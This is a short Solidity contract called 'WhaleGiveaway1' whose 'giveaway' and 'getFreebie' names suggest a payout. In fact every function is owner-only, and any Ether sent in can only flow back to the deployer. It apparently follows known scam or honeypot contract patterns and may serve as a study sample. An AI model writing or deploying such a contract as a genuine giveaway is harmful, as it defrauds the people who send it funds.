pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
address public owner = msg.sender;

function() public payable {}

function getFreebie() public payable onlyOwner {
require(msg.value > 1 ether);
owner.transfer(this.balance);
}

function withdraw() public payable onlyOwner {
owner.transfer(this.balance);
}

function command(address adr, bytes data) public payable onlyOwner {
adr.call.value(msg.value)(data);
}

modifier onlyOwner() {
require(msg.sender == owner);
_;
}
}